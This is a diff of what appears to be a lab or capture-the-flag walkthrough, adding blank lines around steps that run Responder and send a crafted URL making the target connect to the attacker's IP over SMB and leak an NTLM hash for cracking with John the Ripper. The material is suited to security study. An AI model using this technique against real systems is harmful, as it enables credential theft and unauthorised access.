@@ -18,8 +18,11 @@ cracking, which we'll do with a program called John The Ripper.
 
 Check in the Responder.conf file that the flag for SMB is ON.
 Then run Responder with
+
 	sudo python3 Responder.py -I <interface_name> (or sudo responder -I <interface_name>)
+
 Now that the Responder server is listening, we make a request for a nonexistent file in our local machine so that Responder can get the NTLVM hash/challenge
+
 	http:\\<target_ip>/?page=//<our_ip>/somefile
 
 Then we just crack the hash with brute force
